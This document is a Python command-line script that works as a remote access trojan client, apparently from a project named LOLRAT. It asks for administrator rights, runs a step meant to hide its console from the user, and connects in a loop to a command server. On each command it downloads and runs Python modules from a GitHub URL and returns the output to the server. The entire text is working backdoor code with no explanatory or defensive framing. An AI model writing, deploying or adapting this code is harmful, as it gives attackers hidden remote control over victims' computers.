python -c """
import ctypes, os, sys, time, requests, subprocess, socket

def fetch_url_and_execute_cmd(url, args):
    try:
        response = requests.get(url)
        content = response.text if response.status_code == 200 else f'Failed to retrieve content from the URL. Status Code: {response.status_code}'
        command = ['python', '-c', content, *args]
        result = subprocess.run(command, capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f'An error occurred: {e}'

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

host, port = '127.0.0.1', 12345

if is_admin():
    # Hide the console so that the user doesn't see it by running the command
    subprocess.run('DeviceCredentialDeployment', shell=True)
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv), None, 1)
    # If the answer is NO, ask again for admin rights
    if not is_admin():
        print('Admin rights required. Please run the program again as an administrator.')
        #sys.exit(1)

while True:
    try:
        with socket.create_connection((host, port)) as client_socket:
            print('Connected to the server')
            while True:
                command = client_socket.recv(1024).decode('utf-8').split('$')
                url, args = f'https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/{command[0]}.py', [command[1]]
                output = fetch_url_and_execute_cmd(url, args)
                client_socket.send(output.encode('utf-8'))
    except ConnectionRefusedError:
        print('Connection refused. Retrying in 5 seconds...')
        time.sleep(5)
    except Exception as e:
        print(f'An error occurred: {e}')
"""
